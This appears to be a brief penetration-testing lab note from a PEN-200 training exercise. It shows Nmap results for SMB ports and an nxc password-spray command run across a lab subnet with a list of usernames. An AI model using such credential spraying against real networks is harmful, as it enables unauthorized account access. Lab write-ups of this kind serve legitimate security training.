# Nmap

```zsh
PORT   STATE SERVICE REASON  VERSION
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
```

# Exploit

- Password Spray
```sh
┌──(koshi㉿kali)-[~/PEN-200/Skylark/Common]
└─$ nxc smb 192.168.222.0/24 -u usernames.txt -p passwords.txt --continue-on-success         
```

- usernames.txt
```
ftp_jp
l.nguyen
j.jameson
j.jones
reynolds
oscuser
```

- passwords.txt
